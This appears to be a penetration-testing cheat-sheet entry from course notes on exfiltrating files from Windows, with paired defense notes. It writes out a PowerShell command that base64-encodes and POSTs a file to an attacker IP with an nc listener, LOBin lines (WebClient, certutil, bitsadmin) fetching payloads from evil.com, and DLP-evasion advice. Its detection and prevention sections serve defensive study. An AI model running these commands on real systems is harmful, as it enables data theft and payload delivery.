examples.label: CPTS Ch07 — PSUpload IEX then invoke

notes: Exfil from Windows: PowerShell `Invoke-WebRequest -Method PUT`/`-InFile`, base64 via clipboard, or an SMB/HTTP upload server. certutil-base64 for tiny files. Keep it encrypted where possible. PSUpload.ps1 wraps multipart form upload. Base64+POST catches without any server tool — just nc. WebDAV upload requires wsgidav running on attacker (sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous). Also covered in: CPTS Ch07 (File Transfers).
name: Windows - Upload to Attacker
description: Exfil files from Windows: use the PSUpload helper against a Python uploadserver, or base64-encode a file and POST it to a listener.

steps.label: 2b. Base64 POST (target)
steps.command:
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
# attacker: nc -lvnp 8000  then  echo <base64> | base64 -d > hosts

defense.why_it_works: Uploading data OFF a Windows target (PowerShell POST, SMB copy to attacker share, etc.) exfiltrates loot such as credential material or NTDS.dit over a non-C2 channel.
defense.prerequisites: Code execution on the target, sensitive data to exfil, and an attacker-controlled endpoint reachable over an allowed protocol.
defense.impact: Sensitive data (creds, config, NTDS.dit) leaves the environment - a confidentiality breach and a foothold for offline cracking.
defense.detection: Outbound data flows to an external/unknown host - especially large or unusual for the source process - are the tell; DLP and egress monitoring flag uploads of sensitive file types; command line and UA as for downloads.
defense.artifacts: An outbound POST/copy to the attacker; the source process making an unusual network connection; DLP hits on exfiltrated content.
defense.prevention: [MITRE T1048 M1037 Filter Network Traffic] Egress filtering and DLP to detect/block exfil; [M1057 Data Loss Prevention] on sensitive file types; restrict which hosts can reach the internet.
defense.evasion: Encrypt/compress and chunk the data to defeat DLP signatures; exfil over an allowed protocol (HTTPS/SMB) and blend with normal egress volume.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
defense.code_review:
RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.
  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)
GREP:  grep -rniE "move_uploaded_file|\$_FILES|multer|formidable|MultipartFile|SaveAs\(" .
SAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir.
